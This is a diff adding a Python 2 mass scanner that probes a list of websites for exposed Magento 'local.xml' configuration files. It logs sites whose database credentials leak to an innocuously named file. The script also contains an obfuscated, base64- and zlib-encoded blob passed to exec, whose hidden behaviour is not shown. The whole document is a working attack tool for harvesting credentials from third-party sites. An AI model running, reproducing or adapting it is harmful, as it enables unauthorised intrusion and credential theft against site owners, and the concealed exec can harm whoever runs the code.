@@ -1,0 +1,116 @@
+import urllib2, base64, zlib, signal, socket
+import sys, os, time
+#from multiprocessing import Pool
+from multiprocessing.dummy import Pool   
+
+import ssl
+context=ssl._create_unverified_context()
+
+
+
+
+
+
+
+DowloadConfig = [
+'/app/etc/local.xml',
+'/store/app/etc/local.xml',
+'/shop/app/etc/local.xml'
+]
+
+
+
+def Exploitz(site, path):
+
+    global flag
+    try:
+        Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/72.0'}
+        hdr = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/72.0',
+          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+          'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3',
+          'Accept-Encoding': 'none',
+          'Accept-Language': 'en-US,en;q=0.8'}
+#        signal.alarm(5)           
+        Exp =  site + str(path)
+        
+        request = urllib2.Request('http://' + Exp, headers=hdr)
+        CheckWp = urllib2.urlopen(request,timeout=10,context=context).read()          
+        if 'dbname' in str(CheckWp) and '<config>' in str(CheckWp):
+#            base64_bytes = base64.b64encode(Exp)
+#            enc(base64_bytes)
+            with open('htaccess.mg.old', 'a') as ww:
+                ww.write(Exp + '\n')           
+            flag = True
+            return flag
+
+    except:
+        pass
+
+
+
+def Adminergo(site):
+    global flag
+    thread = []
+    flag = False
+    for path in DowloadConfig:
+        if not flag == False:
+            return
+        Exploitz(site, path)    
+#        t = threading.Thread(target=Exploitz, args=(site, path))
+#        t.start()
+#        thread.append(t)
+#        time.sleep(0.9)
+#
+#    for j in thread:
+#        j.join()
+
+def PORT_check(site):
+
+        print(site)
+        try:
+		    
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(3)
+            connect = s.connect_ex((site, 80))
+            if connect == 0:
+               Adminergo(site)
+#                print ('{}=> {}{} {}-->{} PORT 2083 OPEN!!!{}').format( y, g, domain, m, y, w)
+
+         
+            else:                                  
+                 pass
+                 
+        except:
+            pass
+
+exec zlib.decompress(base64.b64decode('eJxNj01LxDAQhu/+imEvTbHmC1zXliIiqAe9CMvuTbbt7DaYTWKaaFX87wZaFoeBB+Ywz/t2uAc0LRmCV+aQl2cwzyPuOvQD1PCTrQf0F7cHNCErIXu230rrHbukHMhWiArWTTQhVvCkTBxBLVfLCvxHKVeU5/CA7ZtlkgueVsC98ri3I7uSlGe/k+sk9fgecQhJGr3WqpH0ZbqQRR+CG0rG2q8GfYc6jrS1R7ZxQvBryaVkn+7VeUtd724S6wWcw9QKCuinNvXcKj8Z7/oUb+P+GROtQ0PmLEVQR7Qx1IIXrTUBx1DPzKlP70j+Bx3LZIg='))
+
+
+def main():
+
+    try:
+#        Target = raw_input(' Best your Websites List: ')
+        Target = sys.argv[1]
+        thread = sys.argv[2]
+        TEXTList = open(Target, 'r').read().splitlines()
+        start = time.time()
+        p = Pool(int(thread))
+        p.map(PORT_check, TEXTList)
+#        p.close()
+#        p.join()
+        end = time.time()
+        totaltime = end - start         
+        open('DONE.txt', 'a').write('-------------\n{} {} \n'.format(sys.argv[1],totaltime))
+
+    except:
+           open('DONE1.txt', 'a').write('-------------\n{} {} \n'.format(sys.argv[1],totaltime))
+
+
+
+
+      
+
+if __name__ == '__main__':
+    main()        
+        
+        
